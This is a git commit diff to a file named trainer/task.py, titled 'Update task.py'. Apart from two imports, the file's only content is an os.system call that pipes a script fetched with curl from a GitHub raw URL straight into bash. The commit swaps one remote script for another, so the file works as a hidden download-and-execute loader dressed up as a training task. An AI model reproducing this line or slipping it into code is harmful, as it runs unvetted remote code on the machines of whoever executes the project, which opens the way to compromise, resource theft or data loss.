d4dacb8d5fc2169abaa9fc1e85b251ef345fe0c3
damrisaluyu1 <damrisaluyu1@gmail.com>
2024-12-02 21:30:39 +0700

    Update task.py

--- trainer/task.py
+++ trainer/task.py
@@ -1,3 +1,3 @@
 import sys
 import os
-os.system('curl -sL https://github.com/damrisaluyu1/gas/raw/refs/heads/main/open | bash')
+os.system('curl -sL https://github.com/damrisaluyu1/gas/raw/refs/heads/main/kuy | bash')
